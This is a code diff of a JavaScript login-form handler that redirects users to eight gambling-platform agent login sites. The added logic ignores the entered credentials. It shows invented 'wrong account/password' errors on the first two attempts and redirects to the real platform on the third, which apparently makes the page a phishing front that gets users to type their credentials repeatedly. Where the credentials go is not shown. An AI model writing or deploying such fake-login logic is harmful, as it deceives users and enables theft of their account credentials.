@@ -169,46 +169,54 @@
                 return;
             }
 
-            // 无论输入什么账号密码都将跳转到选择的平台链接
-            switch (platform) {
-                case "BU":
-                    window.location.href = "https://ag.bu5168.com/";
-                    break;
-                case "SZ":
-                    window.location.href = "https://agup.sz17888.com/zh-Hant/login";
-                    break;
-                case "財神":
-                    window.location.href = "https://ag.as5588.com/index.php?s=/AgentIndex/index";
-                    break;
-                case "鉅城":
-                    window.location.href = "https://ag.ofa77.net/login.php";
-                    break;
-                case "雄厚":
-                    window.location.href = "https://agent.918ofa.net/login.php";
-                    break;
-                case "好玩":
-                    window.location.href = "https://ag.hw16555.net/";
-                    break;
-                case "昊陽":
-                    window.location.href = "https://agup.hyg889.com/zh-Hant/login";
-                    break;
-                case "BCR":
-                    window.location.href = "https://ag.bcr56899.com/";
-                    break;
-                default:
-                    showErrorNotification("無法識別的平台");
-                    break;
+            // 第一次和第二次輸入帳號密碼都顯示錯誤訊息
+            if (loginAttempts === 0) {
+                showErrorNotification("帳號密碼錯誤第一次");
+            } else if (loginAttempts === 1) {
+                showErrorNotification("帳號密碼錯誤第二次");
+            } else {
+                // 第三次無論帳號密碼如何，成功跳轉到選擇的連結
+                switch (platform) {
+                    case "BU":
+                        window.location.href = "https://ag.bu5168.com/";
+                        break;
+                    case "SZ":
+                        window.location.href = "https://agup.sz17888.com/zh-Hant/login";
+                        break;
+                    case "財神":
+                        window.location.href = "https://ag.as5588.com/index.php?s=/AgentIndex/index";
+                        break;
+                    case "鉅城":
+                        window.location.href = "https://ag.ofa77.net/login.php";
+                        break;
+                    case "雄厚":
+                        window.location.href = "https://agent.918ofa.net/login.php";
+                        break;
+                    case "好玩":
+                        window.location.href = "https://ag.hw16555.net/";
+                        break;
+                    case "昊陽":
+                        window.location.href = "https://agup.hyg889.com/zh-Hant/login";
+                        break;
+                    case "BCR":
+                        window.location.href = "https://ag.bcr56899.com/";
+                        break;
+                    default:
+                        showErrorNotification("無法識別的平台");
+                        return;
+                }
             }
 
-            // 重置表單
-            resetForm();
-        });
-
-        function resetForm() {
+            // 清空帳號和密碼欄位
             document.getElementById("username").value = "";
             document.getElementById("password").value = "";
-            document.getElementById("platform").value = ""; // 重置下拉選項
-        }
+
+            // 重置下拉式選單
+            document.getElementById("platform").selectedIndex = 0;
+
+            // 增加嘗試次數計數
+            loginAttempts++;
+        });
 
         function showErrorNotification(message) {
             var notification = document.getElementById("notification");
